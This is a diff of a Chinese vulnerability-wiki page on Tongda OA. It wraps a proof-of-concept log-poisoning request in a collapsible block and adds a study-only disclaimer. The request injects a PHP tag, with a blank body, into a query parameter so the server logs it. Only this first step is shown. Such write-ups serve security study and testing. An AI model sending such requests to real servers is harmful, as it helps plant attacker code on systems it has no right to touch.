@@ -36,12 +36,15 @@ app="TDXK-通达OA"
 
 发送恶意请求让日志被记录
 
-```
-GET /d1a4278d?json={}&aa=<?php                                                                                                                      ?> HTTP/1.1
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">GET /d1a4278d?json={}&amp;aa=&lt;?php                                                                                                                      ?&gt; HTTP/1.1
 Host: 
 User-Agent: Go-http-client/1.1
-Accept-Encoding: gzip
-```
+Accept-Encoding: gzip</code></pre>
+
+</details>
 
 ![image-20220520154539264](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201545324.png)
 
